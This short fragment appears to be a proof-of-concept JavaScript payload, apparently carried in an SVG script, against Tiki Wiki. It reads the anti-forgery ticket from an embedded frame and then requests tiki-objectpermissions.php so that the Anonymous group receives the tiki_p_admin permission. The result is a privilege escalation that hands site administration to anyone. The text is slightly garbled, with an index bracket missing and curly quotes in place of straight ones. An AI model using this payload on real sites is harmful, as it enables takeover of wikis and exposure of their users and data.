svg.script: setTimeout(poc, 3000); function poc() { var iframe = document.getElementById(“frame1”); var fr = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document; var ticket=fr.getElementsByName(‘ticket’)0.value; document.getElementById(‘frame1’).src = “./tiki-objectpermissions.php?objectType=global&permType=global&perm%5BAnonymous%5D%5B%5D=tiki_p_admin&assign=Assign&ticket=”+ticket+”&daconfirm=y”; }
